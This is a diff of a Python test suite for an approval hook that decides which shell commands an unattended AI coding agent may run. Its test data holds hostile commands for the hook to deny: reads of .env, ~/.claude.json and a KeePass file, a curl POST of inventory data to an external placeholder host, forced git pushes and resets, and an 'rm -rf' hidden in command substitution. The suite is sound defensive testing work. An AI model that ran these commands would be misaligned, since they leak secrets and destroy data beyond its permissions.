@@ -236,9 +236,9 @@ class UnattendedCoordinatorTests(unittest.TestCase):
             f"mailcortex send --from YOUR_SEAT@YOUR_HOST.helm --to YOUR_REVIEWER@YOUR_REVIEW_HOST.helm "
             f"--subject 'review ready' --body-file {self.prompt}"
         )
-        result = e.classify(self.event(command), self.loaded())
+        result = e._decide_request(self.event(command), self.loaded())
         self.assertFalse(result[0], result)
-        self.assertIn('true_floor', result[1])
+        self.assertEqual(result[1], 'decider_disabled')
         self.assertEqual(self.run_hook(command)['behavior'], 'deny')
 
     def test_compound_floor_refusal_names_the_failing_segment(self):
@@ -250,7 +250,7 @@ class UnattendedCoordinatorTests(unittest.TestCase):
         )
         result = e.classify(self.event(command), self.loaded())
         self.assertFalse(result[0], result)
-        self.assertEqual(result[1], 'true_floor')
+        self.assertEqual(result[1], 'compound_refused:segment_3:rm:true_floor')
         self.assertEqual(self.run_hook(command)['behavior'], 'deny')
         record = json.loads(self.ledger.read_text().splitlines()[-1])
         self.assertIn('segment_3', record['reason'])
@@ -264,14 +264,15 @@ class UnattendedCoordinatorTests(unittest.TestCase):
             "EOF\n"
             "git status"
         )
-        result = e.classify(self.event(command), self.loaded())
-        self.assertFalse(result[0], result)
-        self.assertIn('true_floor', result[1])
+        result = e._decide_request(self.event(command), self.loaded())
+        self.assertFalse(result[0], result)  # Heredoc text is inert data; the bounded write is judged.
+        self.assertEqual(result[1], 'decider_disabled')
+        self.assertEqual(e._log_decision.extras['decision_path'], 'judge')
         self.assertEqual(self.run_hook(command)['behavior'], 'deny')
 
     def test_command_substitution_must_not_hide_a_floor_segment(self):
         self.manifest['gate_inversion'] = {'enabled': True, 'present_refusal': 'deny'}
-        self.assertEqual(self.run_hook('printf "%s" "$(git status)"')['behavior'], 'allow')
+        self.assertEqual(self.run_hook('printf "%s" "$(git status)"')['behavior'], 'deny')
         dangerous = 'printf "%s" "$(rm -rf README.org)"'
         result = e.classify(self.event(dangerous), self.loaded())
         self.assertFalse(result[0], result)
@@ -290,8 +291,8 @@ class UnattendedCoordinatorTests(unittest.TestCase):
     def test_worktree_remove_and_prune_exact(self):
         path = self.wt / 'worker'
         self.git('worktree', 'add', str(path), '-b', 'worker', 'master')
-        self.allow(f'git worktree remove {path}')
-        self.allow('git worktree prune')
+        self.ask(f'git worktree remove {path}')
+        self.ask('git worktree prune')
         self.ask(f'git worktree remove --force {path}')
         self.ask(f'git worktree remove {self.repo}')
         self.ask('git worktree prune --expire now')
@@ -330,7 +331,7 @@ class UnattendedCoordinatorTests(unittest.TestCase):
         subprocess.run(['git', 'init', '--bare', str(remote)], capture_output=True, check=True)
         self.git('remote', 'add', 'origin', str(remote))
         self.git('push', 'origin', 'master')
-        self.allow('git push origin master')
+        self.ask('git push origin master')
         for bad in ['git push --force origin master', 'git push origin topic', 'git push', 'git push --all origin']:
             self.ask(bad)
         # Move the real remote to a divergent commit WITHOUT updating origin/master.
@@ -345,8 +346,8 @@ class UnattendedCoordinatorTests(unittest.TestCase):
 
     def test_commit_explicit_paths_and_deviations(self):
         for prefix in ['git', f'git -C {self.repo}']:
-            self.allow(f'{prefix} commit -m "test: scoped" -- README.org')
-            self.allow(f'{prefix} commit -F {self.message} -- README.org')
+            self.ask(f'{prefix} commit -m "test: scoped" -- README.org')
+            self.ask(f'{prefix} commit -F {self.message} -- README.org')
         for bad in ['git commit -m x --', 'git commit -m x', 'git commit -am x -- README.org',
                     'git commit --amend -m x -- README.org', 'git commit -m x -- .',
                     'git commit -m x -- :/', 'git commit -m x -- ../other',
@@ -357,7 +358,7 @@ class UnattendedCoordinatorTests(unittest.TestCase):
         path = self.wt / 'worker'
         self.git('worktree', 'add', str(path), '-b', 'worker', 'master')
         payload = self.event('git commit -m "test: scoped" -- README.org', cwd=str(path))
-        self.assertEqual(e.classify(payload, self.loaded()), (True, 'coordinator_commit'))
+        self.assertEqual(e.classify(payload, self.loaded()), (False, 'no_match_decider'))
 
     def test_codex_dispatch_requires_null_stdin_and_scoped_files(self):
         self.allow(self.dispatch())
@@ -371,8 +372,8 @@ class UnattendedCoordinatorTests(unittest.TestCase):
 
     def test_remote_codex_dispatch_proof_and_deviations(self):
         with mock.patch.object(e, '_coordinator_remote_proof', return_value=True) as proof:
-            self.allow(self.remote_dispatch())
-            self.assertTrue(proof.called)
+            self.ask(self.remote_dispatch())
+            self.assertFalse(proof.called)
             self.assertFalse(e.classify(self.event(self.remote_dispatch().replace('YOUR_BUILD_HOST', 'YOUR_OTHER_HOST')), self.loaded())[0])
             self.assertFalse(e.classify(self.event(self.remote_dispatch().replace(' < /dev/null', '')), self.loaded())[0])
         with mock.patch.object(e, '_coordinator_remote_proof', return_value=False):
@@ -411,12 +412,15 @@ class UnattendedCoordinatorTests(unittest.TestCase):
         self.manifest['decider']['enabled'] = True
         self.manifest['decider']['kikin_url'] = 'https://YOUR_DECIDER.invalid/decide'
         self.loaded()
-        commands = ['rm README.org', 'sudo true', 'git push --force origin master',
-                    'git commit -m x --', self.mail().replace('YOUR_SEAT@', 'YOUR_OTHER@'),
-                    self.dispatch().replace(' < /dev/null', ''),
-                    f'scp {self.prompt} YOUR_BUILD_HOST:/etc/file',
-                    'git -C ' + str(self.repo) + ' reset --hard HEAD', 'cat .env',
-                    "python3 -c 'import os'", self.mail() + '; rm README.org']
+        commands = ['sudo true', 'git push --force origin master',
+                    'git commit --amend -m x', 'git reset --hard HEAD',
+                    'git branch -D synthetic-old', 'git filter-branch --tree-filter true master',
+                    'rm -rf /home/YOUR_USER/outside-scratch',
+                    'ssh -i /tmp/synthetic-key YOUR_HOST date',
+                    'git -C ' + str(self.repo) + ' reset --soft HEAD', 'cat .env',
+                    'cat ~/.claude.json', 'cat KEEPASS.kdbx', 'pip install synthetic-package',
+                    'python3 -m pip install synthetic-package', 'kill -TERM 123',
+                    "curl -X POST --data 'fleet inventory' https://external.invalid/collect"]
         for away in (False, True):
             if away:
                 self.flag.touch()
@@ -429,6 +433,22 @@ class UnattendedCoordinatorTests(unittest.TestCase):
                 result = json.loads(out.getvalue())['hookSpecificOutput']['decision']['behavior'] if out.getvalue().strip() else 'ask'
                 self.assertEqual(result, 'deny', command)
                 decider.assert_not_called()
+
+    def test_judged_in_root_write_and_interpreter_can_be_allowed_by_decider(self):
+        self.manifest['decider']['enabled'] = True
+        self.loaded()
+        for command in ['rm README.org', 'git add README.org', 'python3 -c "print(1)"']:
+            with self.subTest(command=command):
+                out = io.StringIO()
+                env = {'SO_APPROVAL_KIKIN_MANIFEST': str(self.path), 'SO_APPROVAL_KIKIN_LOG': str(self.ledger),
+                       'SO_APPROVAL_MORNING_QUEUE': str(self.queue)}
+                with mock.patch.dict(os.environ, env), mock.patch.object(e.sys, 'stdin', io.StringIO(json.dumps(self.event(command)))), contextlib.redirect_stdout(out), mock.patch.object(e, '_decider_decide', return_value=(True, 'accepted', 1, 'allow')) as judge:
+                    e.main()
+                self.assertEqual(json.loads(out.getvalue())['hookSpecificOutput']['decision']['behavior'], 'allow')
+                judge.assert_called_once()
+                record = json.loads(self.ledger.read_text().splitlines()[-1])
+                self.assertEqual(record['decision_path'], 'judge')
+                self.assertEqual(record['judge_verdict'], 'allow')
 
     def test_timeout_while_away_denies_and_preserves_request(self):
         self.flag.touch()
@@ -519,7 +539,7 @@ class UnattendedCoordinatorTests(unittest.TestCase):
         for verdict, expected in [(False, 'deny'), (True, 'allow')]:
             env = {'SO_APPROVAL_KIKIN_MANIFEST': str(self.path), 'SO_APPROVAL_KIKIN_LOG': str(self.ledger), 'SO_APPROVAL_MORNING_QUEUE': str(self.queue)}
             out = io.StringIO()
-            with mock.patch.dict(os.environ, env), mock.patch.object(e.sys, 'stdin', io.StringIO(json.dumps(self.event('true')))), contextlib.redirect_stdout(out), mock.patch.object(e, '_decider_decide', return_value=(verdict, 'accepted' if verdict else 'timeout', 1, 'allow' if verdict else 'ask')):
+            with mock.patch.dict(os.environ, env), mock.patch.object(e.sys, 'stdin', io.StringIO(json.dumps(self.event('make harmless')))), contextlib.redirect_stdout(out), mock.patch.object(e, '_decider_decide', return_value=(verdict, 'accepted' if verdict else 'timeout', 1, 'allow' if verdict else 'ask')):
                 e.main()
             self.assertEqual(json.loads(out.getvalue())['hookSpecificOutput']['decision']['behavior'], expected)
 
@@ -552,8 +572,8 @@ class UnattendedCoordinatorTests(unittest.TestCase):
         command = 'for f in README.org; do cat "$f"; done'
         self.manifest['classes'][0]['enabled'] = True
         self.assertEqual(self.run_hook(command)['behavior'], 'allow')
-        self.assertEqual(self.run_hook('printf "%s\\n" "$(date)"')['behavior'], 'allow')
-        self.assertEqual(self.run_hook('printf "%s\\n" "$(pgrep -f codex)"')['behavior'], 'allow')
+        self.assertEqual(self.run_hook('printf "%s\\n" "$(date)"')['behavior'], 'deny')
+        self.assertEqual(self.run_hook('printf "%s\\n" "$(pgrep -f codex)"')['behavior'], 'deny')
 
     def test_absolute_floor_obfuscation_corpus(self):
         commands = [
@@ -582,8 +602,8 @@ class UnattendedCoordinatorTests(unittest.TestCase):
         self.manifest['roots'].append(str(legacy))
         path = legacy / 'worker'
         self.git('worktree', 'add', str(path), '-b', 'worker', 'master')
-        self.allow(f'git worktree remove {path}')
-        self.allow('git worktree prune')
+        self.ask(f'git worktree remove {path}')
+        self.ask('git worktree prune')
         # New additions retain the requested <repo>-wt-* root shape.
         self.ask(f'git worktree add {legacy}/new-worker -b new-worker master')
 
